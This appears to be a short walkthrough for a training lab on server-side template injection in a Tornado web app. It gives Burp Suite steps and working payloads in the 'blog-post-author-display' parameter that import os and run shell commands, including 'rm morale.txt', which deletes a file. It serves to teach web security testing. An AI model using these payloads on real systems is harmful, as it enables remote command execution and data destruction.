# Lab: Basic server-side template injection (code context)

This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.

You can log in to your own account using the following credentials: `wiener:peter`

{% hint style="info" %}
Take a closer look at the "preferred name" functionality.
{% endhint %}

## Steps

* Open Burp Suite and visit the target website
* Login using wiener:peter as username and password
* Change the Preferred name to First name and click on Submit
* Send the request to repeater
* In the Repeater tab change the `blog-post-author-display` parameter to `user.first_name}}{%25+import+os+%25}{{os.system('whoami')`
* Use the below payloads to solve the lab

```
user.first_name}}{%25+import+os+%25}{{os.system('ls')

user.first_name}}{%25+import+os+%25}{{os.system('rm morale.txt')
```

* Congrats! You have solved the lab.
